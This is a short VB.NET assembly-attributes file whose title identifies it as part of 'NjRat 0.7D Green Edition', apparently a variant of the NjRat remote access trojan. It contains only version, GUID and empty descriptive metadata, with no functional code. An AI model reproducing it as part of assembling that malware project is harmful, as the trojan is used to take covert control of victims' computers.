﻿Imports System
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices

<Assembly: AssemblyVersion("0.0.0.7")>
<Assembly: ComVisible(False)>
<Assembly: AssemblyTrademark("")>
<Assembly: AssemblyDescription("")>
<Assembly: AssemblyFileVersion("0.0.0.7")>
<Assembly: Guid("c0a9a70f-63e8-42ca-965d-73a1bc903e62")>
<Assembly: AssemblyTitle("NjRat 0.7D Green Edition by im523")>
<Assembly: AssemblyCopyright("")>
<Assembly: AssemblyProduct("")>
<Assembly: AssemblyCompany("")>
